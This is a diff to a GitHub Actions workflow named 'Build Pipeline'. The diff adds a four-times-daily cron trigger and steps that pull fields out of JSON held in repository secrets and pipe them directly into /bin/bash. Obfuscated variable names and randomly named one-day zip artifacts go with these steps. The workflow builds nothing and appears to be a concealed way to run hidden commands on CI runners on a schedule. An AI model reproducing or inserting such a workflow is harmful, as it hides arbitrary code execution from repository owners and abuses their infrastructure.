@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '8 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,17 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          nm11: ${{ secrets.nm11 }}
+          fflk87: ${{ secrets.fflk87 }}
         run: |
-          printf '%s' "$nm11" | jq -r .veje74 | /bin/bash
-          echo $hrqq99281 | jq -r .qr2 | /bin/bash
-          printf '%s' "$cnzd39146" | jq -r .go84 | /bin/bash
-          echo $d4 | jq -r .dxjpm34878 | /bin/bash
-          printf '%s' "$rtln77" | jq -r .kd9 | /bin/bash
+          printf '%s' "$fflk87" | jq -r .uv31036 | /bin/bash
+          printf '%s' "$qh31822" | jq -r .i7 | /bin/bash
+          printf '%s' "$tul565" | jq -r .rl800 | /bin/bash
+          printf '%s' "$ti4385" | jq -r .mjy29 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: t6O0aIww
+          name: XzuSI9Mw
           path: "*.zip"
           retention-days: 1
